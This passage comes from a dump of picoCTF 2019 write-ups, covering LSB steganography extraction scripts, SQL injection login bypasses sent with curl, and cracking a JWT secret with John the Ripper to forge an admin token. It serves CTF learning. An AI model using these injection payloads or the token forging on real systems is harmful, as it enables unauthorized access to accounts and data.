a0 e0 00 c0 c1 01 00 c0 c0 20 00 c0 c0 41 01 c0  ......... ...A..\r\n00000403: c0 60 00 c0 c0 80 01 c1 c0 a0 00 f0 fa fe 00 a5  .`..............\r\n00000413: a1 a0 00 80 80 80 00 00 01 ff 00 00 ff 00 00 00  ................\r\n00000423: fe ff 01 fe 00 00 00 fe 00 fe 01 ff fe 00 00 fe  ................\r\n00000433: fe fe 00 e9 e9 e8 e8 e8 e8 e8 e8 e8 e9 e9 e8 e8  ................\r\n00000443: e8 e9 e8 e8 e8 e9 e9 e8 e8 e8 e8 e8 e8 e9 e9 e9  ................\r\n00000453: e8 e8 e8 e9 e8 e8 e8 e8 e9 e9 e8 e8 e8 e9 e8 e8  ................\r\n00000463: e9 e9 e8 e8 e8 e9 e9 e9 e8 e9 e9 e8 e8 e8 e8 e8  ................\r\n00000473: e8 e8 e9 e9 e8 e8 e8 e9 e8 e8 e8 e8 e9 e9 e8 e8  ................\r\n00000483: e9 e8 e9 e8 e8 e9 e9 e8 e8 e9 e8 e9 e9 e9 e9 e9  ................\r\n00000493: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n000004a3: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n```\r\n\r\nWe reverse the logic with the following script:\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nwith open(\"encoded.bmp\", \"rb\") as b:\r\n    b.seek(0x2d3)\r\n    bin_str = \"\"\r\n    for j in range(100):\r\n        if ((j & 1) == 0):\r\n            for k in range(8):\r\n                bin_str += str(ord(b.read(1)) & 1)\r\n        else:\r\n            b.read(1)\r\n\r\nchar_str = unbits(bin_str, endian = 'little')\r\nprint char_str\r\n```\r\n\r\nThe result:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_3# python solve.py\r\npicoCTF{4n0th3r_L5b_pr0bl3m_000000000000018a270ae}\r\n```", "timestamp": "2025-10-21T13:36:26.806009"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Investigative_Reversing_4.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_4.md", "content": "# Investigative Reversing 4\r\nForensics, 400 points\r\n\r\n## Description:\r\n> We have recovered a binary and 5 images: image01, image02, image03, image04, image05. See what you can make of it. There should be a flag somewhere.\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Investigative Reversing 3](Investigative_Reversing_3.md).\r\n\r\nAgain, let's check the binary with Ghidra:\r\n\r\n```c\r\nundefined8 main(void)\r\n{\r\n  size_t sVar1;\r\n  undefined4 local_4c;\r\n  undefined local_48 [52];\r\n  int local_14;\r\n  FILE *flag_file;\r\n  \r\n  flag = local_48;\r\n  local_4c = 0;\r\n  flag_index = &local_4c;\r\n  flag_file = fopen(\"flag.txt\",\"r\");\r\n  if (flag_file == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  sVar1 = fread(flag,0x32,1,flag_file);\r\n  local_14 = (int)sVar1;\r\n  if (local_14 < 1) {\r\n    puts(\"Invalid Flag\");\r\n                    /* WARNING: Subroutine does not return */\r\n    exit(0);\r\n  }\r\n  fclose(flag_file);\r\n  encodeAll();\r\n  return 0;\r\n}\r\n\r\nvoid encodeAll(void)\r\n{\r\n  ulong local_48;\r\n  undefined8 local_40;\r\n  undefined4 local_38;\r\n  ulong local_28;\r\n  undefined8 local_20;\r\n  undefined4 local_18;\r\n  char local_9;\r\n  \r\n  local_28 = 7160496016605934665;   // \"Item01_c\"\r\n  local_20 = 482871488112;          // \"p.bmp\\x00\\x00\\x00\"\r\n  local_18 = 0;\r\n  local_48 = 7074646148709184585;   // \"Item01.b\"\r\n  local_40 = 28781;                 // \"mp\\x00\\x00\"\r\n  local_38 = 0;\r\n  local_9 = '5';\r\n  while ('0' < local_9) {\r\n    local_48._0_6_ = CONCAT15(local_9,(undefined5)local_48);\r\n    local_48 = local_48 & 0xffff000000000000 | (ulong)(uint6)local_48;\r\n    local_28._0_6_ = CONCAT15(local_9,(undefined5)local_28);\r\n    local_28 = local_28 & 0xffff000000000000 | (ulong)(uint6)local_28;\r\n    encodeDataInFile((char *)&local_48,(char *)&local_28);\r\n    local_9 = local_9 + -1;\r\n  }\r\n  return;\r\n}\r\n\r\nvoid encodeDataInFile(char *src_file,char *dst_file)\r\n{\r\n  size_t sVar1;\r\n  ulong uVar2;\r\n  byte b;\r\n  char encoded_b;\r\n  int limit;\r\n  FILE *dst_fd;\r\n  FILE *src_fd;\r\n  int k;\r\n  int j;\r\n  int i;\r\n  int local_c;\r\n  \r\n  src_fd = fopen(src_file,\"r\");\r\n  dst_fd = fopen(dst_file,\"a\");\r\n  if (src_fd != (FILE *)0x0) {\r\n    sVar1 = fread(&b,1,1,src_fd);\r\n    local_c = (int)sVar1;\r\n    limit = 2019;\r\n    i = 0;\r\n    while (i < limit) {\r\n      fputc((int)(char)b,dst_fd);\r\n      sVar1 = fread(&b,1,1,src_fd);\r\n      local_c = (int)sVar1;\r\n      i = i + 1;\r\n    }\r\n    j = 0;\r\n    while (j < 50) {\r\n      if (j % 5 == 0) {\r\n        k = 0;\r\n        while (k < 8) {\r\n          uVar2 = codedChar(k,*(byte *)(*flag_index + flag),b);\r\n          encoded_b = (char)uVar2;\r\n          fputc((int)encoded_b,dst_fd);\r\n          fread(&b,1,1,src_fd);\r\n          k = k + 1;\r\n        }\r\n        *flag_index = *flag_index + 1;\r\n      }\r\n      else {\r\n        fputc((int)(char)b,dst_fd);\r\n        fread(&b,1,1,src_fd);\r\n      }\r\n      j = j + 1;\r\n    }\r\n    while (local_c == 1) {\r\n      fputc((int)(char)b,dst_fd);\r\n      sVar1 = fread(&b,1,1,src_fd);\r\n      local_c = (int)sVar1;\r\n    }\r\n    fclose(dst_fd);\r\n    fclose(src_fd);\r\n    return;\r\n  }\r\n  puts(\"No output found, please run this on the server\");\r\n                    /* WARNING: Subroutine does not return */\r\n  exit(0);\r\n}\r\n\r\n\r\nulong codedChar(int param_1,byte param_2,byte param_3)\r\n{\r\n  byte local_20;\r\n  \r\n  local_20 = param_2;\r\n  if (param_1 != 0) {\r\n    local_20 = (byte)((int)(char)param_2 >> ((byte)param_1 & 0x1f));\r\n  }\r\n  return (ulong)(param_3 & 0xfe | local_20 & 1);\r\n}\r\n```\r\n\r\nIn this case the data is encoded in 5 files: `Item05_cp.bmp` to `Item01_cp.bmp`. In each case, the program jumps to offset `2019` and LSB-encodes a byte from the flag in 8 bytes from the original file, then copies another 4 bytes from the original file. Every file contains 10 bytes from the flag.\r\n\r\nFor example:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_4# xxd -g 1 -s $((2019 - 32)) -l $((10*8 + 48 + 64)) Item05_cp.bmp\r\n000007c3: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n000007d3: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n000007e3: e8 e8 e8 e8 e9 e9 e9 e8 e8 e8 e8 e8 e9 e8 e8 e9  ................\r\n000007f3: e8 e9 e9 e8 e8 e8 e8 e8 e9 e9 e8 e8 e8 e9 e9 4e  ...............N\r\n00000803: 4f 4f 4f 4f e9 e9 e9 e9 e8 e9 e9 e8 e8 e8 e8 e8  OOOO............\r\n00000813: e9 e9 e8 e8 e8 e8 e9 e8 e8 e8 e8 e8 e8 e8 e9 e8  ................\r\n00000823: e9 e8 e9 e8 e8 e8 e8 e8 e8 e9 e9 e8 e8 e8 e9 e8  ................\r\n00000833: e8 e8 e8 e8 e9 e9 e8 e9 e9 e9 e9 e8 e8 e8 e8 e8  ................\r\n00000843: e8 e9 e9 e9 e8 e8 e9 e8 e8 e8 e8 e8 e9 e8 e8 e8  ................\r\n00000853: e9 e9 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n00000863: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n00000873: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n```\r\n\r\nTherefore, to extract the flag, we use the following script:\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nbin_str = \"\"\r\nfor i in range(5, 0, -1):\r\n    with open(\"Item0{}_cp.bmp\".format(i), \"rb\") as b:\r\n        b.seek(2019)\r\n        \r\n        for j in range(50):\r\n            if ((j % 5) == 0):\r\n                for k in range(8):\r\n                    bin_str += str(ord(b.read(1)) & 1)\r\n            else:\r\n                b.read(1)\r\n\r\nchar_str = unbits(bin_str, endian = 'little')\r\nprint char_str\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_4# python solve.py\r\npicoCTF{N1c3_R3ver51ng_5k1115_0000000000023ef6902}\r\n```\r\n", "timestamp": "2025-10-21T13:36:26.939646"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Irish-Name-Repo_1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Irish-Name-Repo_1.md", "content": "# Irish-Name-Repo 1\r\nWeb Exploitation, 300 points\r\n\r\n## Description:\r\n> There is a website running at http://2019shell1.picoctf.com:4162. Do you think you can log us in? Try to see if you can login!\r\n\r\n\r\n## Solution: \r\n\r\n\r\nThe website offered an admin login page:\r\n\r\n```html\r\n<form action=\"login.php\" method=\"POST\">\r\n    <fieldset>\r\n        <div class=\"form-group\">\r\n            <label for=\"username\">Username:</label>\r\n            <input type=\"text\" id=\"username\" name=\"username\" class=\"form-control\">\r\n        </div>\r\n        <div class=\"form-group\">\r\n            <label for=\"password\">Password:</label>\r\n            <div class=\"controls\">\r\n                <input type=\"password\" id=\"password\" name=\"password\" class=\"form-control\">\r\n            </div>\r\n        </div>\r\n        <input type=\"hidden\" name=\"debug\" value=\"0\">\r\n\r\n        <div class=\"form-actions\">\r\n            <input type=\"submit\" value=\"Login\" class=\"btn btn-primary\">\r\n        </div>\r\n    </fieldset>\r\n</form>\r\n```\r\n\r\nIn order to bypass the authentication logic, all we needed to do is provide a classic SQLi string:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl \"https://2019shell1.picoctf.com/problem/4162/login.php\" --data \"username=admin&password='+or+1=1--\" && echo\r\n<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_96ab211c}</p>\r\n```\r\n\r\nIt was also possible to set the `debug` parameter in order to inspect the SQL statement:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_1# curl \"https://2019shell1.picoctf.com/problem/4162/login.php\" --data \"username=admin&password='+or+1=1--&debug=1\" && echo\r\n<pre>username: admin\r\npassword: ' or 1=1--\r\nSQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1--'\r\n</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_96ab211c}</p>\r\n```", "timestamp": "2025-10-21T13:36:27.055373"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Irish-Name-Repo_2.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Irish-Name-Repo_2.md", "content": "# Irish-Name-Repo 2\r\nWeb Exploitation, 350 points\r\n\r\n## Description:\r\n> There is a website running at https://2019shell1.picoctf.com/problem/60775/. Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! \r\n\r\n\r\n## Solution: \r\n\r\n\r\nThe website offered an admin login page:\r\n\r\n```html\r\n<form action=\"login.php\" method=\"POST\">\r\n    <fieldset>\r\n        <div class=\"form-group\">\r\n            <label for=\"username\">Username:</label>\r\n            <input type=\"text\" id=\"username\" name=\"username\" class=\"form-control\">\r\n        </div>\r\n        <div class=\"form-group\">\r\n            <label for=\"password\">Password:</label>\r\n            <div class=\"controls\">\r\n                <input type=\"password\" id=\"password\" name=\"password\" class=\"form-control\">\r\n            </div>\r\n        </div>\r\n        <input type=\"hidden\" name=\"debug\" value=\"0\">\r\n\r\n        <div class=\"form-actions\">\r\n            <input type=\"submit\" value=\"Login\" class=\"btn btn-primary\">\r\n        </div>\r\n    </fieldset>\r\n</form>\r\n```\r\n\r\nThe solution from the [previous challenge](Irish-Name-Repo_1.md) didn't work anymore:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl \"https://2019shell1.picoctf.com/problem/60775/login.php\" --data \"username=admin&password='+or+1=1--\" && echo\r\n<h1>SQLi detected.</h1>\r\n```\r\n\r\nHowever, attacking the `login` field instead of the `password` field allowed bypassing the authentication logic:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl \"https://2019shell1.picoctf.com/problem/60775/login.php\" --data \"username=admin'--&password=1\" && echo\r\n<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>\r\n```\r\n\r\nIt was also possible to set the `debug` parameter in order to inspect the SQL statement:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl \"https://2019shell1.picoctf.com/problem/60775/login.php\" --data \"username=admin'--&password=1&debug=1\" && echo\r\n<pre>username: admin'--\r\npassword: 1\r\nSQL query: SELECT * FROM users WHERE name='admin'--' AND password='1'\r\n</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>\r\n```\r\n\r\n", "timestamp": "2025-10-21T13:36:27.157573"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Irish-Name-Repo_3.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Irish-Name-Repo_3.md", "content": "# Irish-Name-Repo 3\r\nWeb Exploitation, 400 points\r\n\r\n## Description:\r\n> There is a secure website running at http://2019shell1.picoctf.com:12271. Try to see if you can login as admin!\r\n\r\n\r\n## Solution: \r\n\r\n\r\nThe website offered an admin login page:\r\n\r\n```html\r\n<form action=\"login.php\" method=\"POST\">\r\n    <fieldset>\r\n        <div class=\"form-group\">\r\n            <label for=\"username\">Username:</label>\r\n            <input type=\"text\" id=\"username\" name=\"username\" class=\"form-control\">\r\n        </div>\r\n        <div class=\"form-group\">\r\n            <label for=\"password\">Password:</label>\r\n            <div class=\"controls\">\r\n                <input type=\"password\" id=\"password\" name=\"password\" class=\"form-control\">\r\n            </div>\r\n        </div>\r\n        <input type=\"hidden\" name=\"debug\" value=\"0\">\r\n\r\n        <div class=\"form-actions\">\r\n            <input type=\"submit\" value=\"Login\" class=\"btn btn-primary\">\r\n        </div>\r\n    </fieldset>\r\n</form>\r\n```\r\n\r\nThe solution from the [Irish-Name-Repo_1](Irish-Name-Repo_1.md) and [Irish-Name-Repo_2](Irish-Name-Repo_2.md) didn't work anymore.\r\n\r\nUsing the debug interface, we can inspect the SQL query:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl \"https://2019shell1.picoctf.com/problem/12271/login.php\" --data \"password=test&debug=1\"\r\n<pre>password: test\r\nSQL query: SELECT * FROM admin where password = 'grfg'\r\n</pre><h1>Login failed.</h1>\r\n```\r\n\r\nIt looks like the password was somehow encrypted. Given the fact that `t` was replaced with `g` twice, this might be a substitution cipher.\r\n\r\nLet's try a simple injection:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl \"https://2019shell1.picoctf.com/problem/12271/login.php\" --data \"password=' or 1=1--&debug=1\"\r\n<pre>password: ' or 1=1--\r\nSQL query: SELECT * FROM admin where password = '' be 1=1--'\r\n</pre>\r\n```\r\n\r\nNow let's try again, sending `be` instead of `or`:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Irish-Name-Repo_3# curl \"https://2019shell1.picoctf.com/problem/12271/login.php\" --data \"password=' be 1=1--&debug=1\" && echo\r\n<pre>password: ' be 1=1--\r\nSQL query: SELECT * FROM admin where password = '' or 1=1--'\r\n</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_ef7eac2f}</p>\r\n```\r\n\r\n\r\n", "timestamp": "2025-10-21T13:36:27.318383"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/JaWT_Scratchpad.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/JaWT_Scratchpad.md", "content": "# JaWT Scratchpad\r\nWeb Exploitation, 400 points\r\n\r\n## Description:\r\n> Check the admin scratchpad!\r\n\r\n\r\n## Solution: \r\n\r\nLet's connect to the provided website:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl https://2019shell1.picoctf.com/problem/37903/\r\n<!doctype html>\r\n<html>\r\n        <title> JaWT - an online scratchpad </title>\r\n        <link rel=\"stylesheet\" href=\"/static/css/stylesheet.css\">\r\n        <body>\r\n                <header><h1>JaWT</h1> <br> <i><small>powered by <a href=\"https://jwt.io/\">JWT</a></small></i></header>\r\n                <div id=\"main\">\r\n                        <article>\r\n                                <h1>Welcome to JaWT!</h1>\r\n\r\n                                <p>\r\n                                        JaWT is an online scratchpad, where you can \"jot\" down whatever you'd like! Consider it a notebook for your thoughts. <b style=\"color:blue \"> JaWT works best in Google Chrome for some reason. </b>\r\n                                </p>\r\n\r\n                                <p>\r\n                                        You will need to log in to access the JaWT scratchpad. You can use any name, other than <code>admin</code>... because the <code>admin</code> user gets a special scratchpad!\r\n                                </p>\r\n                                <br>\r\n                                <form action=\"#\" method=\"POST\">\r\n                                        <input type=\"text\" name=\"user\" id=\"name\">\r\n                                </form>\r\n                                <br>\r\n\r\n                                <h2> Register with your name! </h2>\r\n                                <p>\r\n                                        You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like <a href=\"https://github.com/magnumripper/JohnTheRipper\">John</a>!\r\n                                </p>\r\n                        </article>\r\n                        <nav></nav>\r\n                        <aside></aside>\r\n                </div>\r\n                <script> window.onload = function() { document.getElementById(\"name\").focus(); }; </script>\r\n        </body>\r\n</html>\r\n```\r\n\r\nIf we try to login as `admin`, we get an error:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl \"https://2019shell1.picoctf.com/problem/37903/\"  -H \"Content-Type: application/x-www-form-urlencoded\"  --data \"user=admin\"\r\n...\r\n    <p style=\"color:red\">\r\n            YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.\r\n    </p>\r\n...\r\n```\r\n\r\nHowever, logging in as another user is allowed:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl \"https://2019shell1.picoctf.com/problem/37903/\"  -H \"Content-Type: application/x-www-form-urlencoded\"  --data \"user=john\" -v\r\n*   Trying 3.15.247.173...\r\n* TCP_NODELAY set\r\n* Expire in 200 ms for 4 (transfer 0x558ed4e47d10)\r\n* Connected to 2019shell1.picoctf.com (3.15.247.173) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: none\r\n  CApath: /etc/ssl/certs\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server accepted to use http/1.1\r\n* Server certificate:\r\n*  subject: OU=Domain Control Validated; OU=PositiveSSL Wildcard; CN=*.picoctf.com\r\n*  start date: Oct 26 00:00:00 2018 GMT\r\n*  expire date: Nov  1 23:59:59 2020 GMT\r\n*  subjectAltName: host \"2019shell1.picoctf.com\" matched cert's \"*.picoctf.com\"\r\n*  issuer: C=GB; ST=Greater Manchester; L=Salford; O=COMODO CA Limited; CN=COMODO RSA Domain Validation Secure Server CA\r\n*  SSL certificate verify ok.\r\n> POST /problem/37903/ HTTP/1.1\r\n> Host: 2019shell1.picoctf.com\r\n> User-Agent: curl/7.64.0\r\n> Accept: */*\r\n> Content-Type: application/x-www-form-urlencoded\r\n> Content-Length: 9\r\n>\r\n* upload completely sent off: 9 out of 9 bytes\r\n< HTTP/1.1 302 FOUND\r\n< Server: nginx\r\n< Date: Sun, 13 Oct 2019 11:28:56 GMT\r\n< Content-Type: text/html; charset=utf-8\r\n< Content-Length: 209\r\n< Connection: keep-alive\r\n< Location: https://2019shell1.picoctf.com/\r\n< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y; Path=/\r\n< Strict-Transport-Security: max-age=0\r\n<\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\r\n<title>Redirecting...</title>\r\n<h1>Redirecting...</h1>\r\n* Connection #0 to host 2019shell1.picoctf.com left intact\r\n<p>You should be redirected automatically to target URL: <a href=\"/\">/</a>.  If not click the link.\r\n```\r\n\r\nNotice the cookie we receive upon a successful login:\r\n```\r\n< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y; Path=/\r\n```\r\n\r\n\"JWT\" stands for \"[JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)\":\r\n\r\n> JSON Web Token (JWT) is an Internet standard for creating JSON-based access tokens that assert some number of claims. For example, a server could generate a token that has the claim \"logged in as admin\" and provide that to a client. The client could then use that token to prove that it is logged in as admin. The tokens are signed by one party's private key (usually the server's), so that both parties (the other already being, by some suitable and trustworthy means, in possession of the corresponding public key) are able to verify that the token is legitimate.\r\n\r\nWe can decode the token using an [online tool](https://jwt.io/) or via the CyberChef API:\r\n```\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# export NODE_PATH=$(npm root --quiet -g)\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# node\r\n> const chef = require(\"cyberchef\");\r\nundefined\r\n> chef.JWTDecode(\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y\");\r\n{\r\n    \"user\": \"john\"\r\n}\r\n>\r\n```\r\n\r\nWe can change the user to \"admin\", but we'll need to sign the token and we don't have the key. That's where \"JohnTheRipper\" (referenced in the website itself) comes in.\r\n\r\n[This post](https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature) explains how to brute force JWT using JohnTheRipper.\r\n\r\nFirst, we need to convert the token to a format that JohnTheRipper can understand, using the following script:\r\n\r\n```python\r\n# https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature\r\n# https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py\r\nimport sys\r\nfrom jwt.utils import base64url_decode\r\nfrom binascii import hexlify\r\n\r\n\r\ndef jwt2john(jwt):\r\n    \"\"\"\r\n    Convert signature from base64 to hex, and separate it from the data by a #\r\n    so that John can parse it.\r\n    \"\"\"\r\n    jwt_bytes = jwt.encode('ascii')\r\n    parts = jwt_bytes.split(b'.')\r\n\r\n    data = parts[0] + b'.' + parts[1]\r\n    signature = hexlify(base64url_decode(parts[2]))\r\n\r\n    return (data + b'#' + signature).decode('ascii')\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) != 2:\r\n        print(\"Usage: %s JWT\" % sys.argv[0])\r\n    else:\r\n        john = jwt2john(sys.argv[1])\r\n        print(john)\r\n```\r\n\r\nRunning it:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9ob\r\niJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y > jwt.john\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# cat jwt.john\r\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9#fdf005dc7db77243f842d1753e8ddea6e656c666f0a48f10dba8513c34e1df66\r\n```\r\n\r\nNow we run `john` to try and locate the key (we'll use a dictionary attack):\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# ~/utils/john/run/john jwt.john  --wordlist=/root/utils/dictionaries/rockyou.txt\r\nUsing default input encoding: UTF-8\r\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])\r\nWarning: OpenMP is disabled; a non-OpenMP build may be faster\r\nPress 'q' or Ctrl-C to abort, almost any other key for status\r\nilovepico        (?)\r\n1g 0:00:00:05 DONE (2019-10-13 14:44) 0.1996g/s 1476Kp/s 1476Kc/s 1476KC/s ilovepinkxxx..ilovepatopollo\r\nUse the \"--show\" option to display all of the cracked passwords reliably\r\nSession completed\r\n```\r\n\r\nWe modify the user to \"admin\" and resign with the key (`ilovepico`):\r\n\r\n```\r\n> jwt = { \"user\": \"admin\" };\r\n{ user: 'admin' }\r\n> chef.JWTSign(jwt, [\"ilovepico\", \"HS256\"]);\r\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1NzA5Njg2NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8\r\n```\r\n\r\nWe resend the request to the website and receive the flag:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl \"https://2019shell1.picoctf.com/problem/37903/#\"  -H \"Content-Type: application/x-www-form-urlencoded\"  --data \"user=admin\" -H \"Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1NzA5Njg2NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8\" -s | grep pico\r\n                                        <textarea style=\"margin: 0 auto; display: block;\">picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</textarea>\r\n```\r\n\r\n", "timestamp": "2025-10-21T13:36:27.414901"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Java_Script_Kiddie.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Java_Script_Kiddie.md", "content": "# Java Script Kiddie\r\nWeb Exploitation, 400 points\r\n\r\n## Description:\r\n> The image link appears broken...\r\n\r\n\r\n## Solution: \r\n\r\nThe source of the attached website is as follows:\r\n\r\n```html\r\n<html>\r\n\t<head>    \r\n\t\t<script src=\"jquery-3.3.1.min.js\"></script>\r\n\t\t<script>\r\n\t\t\tvar bytes = [];\r\n\t\t\t$.get(\"bytes\", function(resp) {\r\n\t\t\t\tbytes = Array.from(resp.split(\" \"), x => Number(x));\r\n\t\t\t});\r\n\r\n\t\t\tfunction assemble_png(u_in){\r\n\t\t\t\tvar LEN = 16;\r\n\t\t\t\tvar key = \"0000000000000000\";\r\n\t\t\t\tvar shifter;\r\n\t\t\t\tif(u_in.length == LEN){\r\n\t\t\t\t\tkey = u_in;\r\n\t\t\t\t}\r\n\t\t\t\tvar result = [];\r\n\t\t\t\tfor(var i = 0; i < LEN; i++){\r\n\t\t\t\t\tshifter = key.charCodeAt(i) - 48;\r\n\t\t\t\t\tfor(var j = 0; j < (bytes.length / LEN); j ++){\r\n\t\t\t\t\t\tresult[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\twhile(result[result.length-1] == 0){\r\n\t\t\t\t\tresult = result.slice(0,result.length-1);\r\n\t\t\t\t}\r\n\t\t\t\tdocument.getElementById(\"Area\").src = \"data:image/png;base64,\" + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t</script>\r\n\t</head>\r\n\t<body>\r\n\r\n\t\t<center>\r\n\t\t\t<form action=\"#\" onsubmit=\"assemble_png(document.getElementById('user_in').value)\">\r\n\t\t\t\t<input type=\"text\" id=\"user_in\">\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\n\t\t\t</form>\r\n\t\t\t<img id=\"Area\" src=\"\"/>\r\n\t\t</center>\r\n\r\n\t</body>\r\n</html>\r\n```\r\n\r\nIf we enter a random value in the form, we receive a broken image. It looks like the javascript code first makes a request to receive a list of bytes:\r\n```\r\n137 147 206 121 126 59 121 231 0 4 121 188 174 107 242 107 0 124 231 234 119 50 0 0 1 147 229 170 73 153 65 191 164 121 48 249 53 254 26 10 84 199 169 75 0 28 1 53 48 82 78 249 171 61 1 114 224 133 203 169 155 66 255 130 145 80 1 183 76 131 68 65 89 229 134 32 113 72 148 82 12 0 0 184 2 218 186 76 169 250 151 249 194 192 96 108 170 0 134 157 119 75 131 120 112 231 157 255 131 65 68 235 231 12 6 192 0 222 228 69 249 69 255 1 157 110 95 204 59 230 195 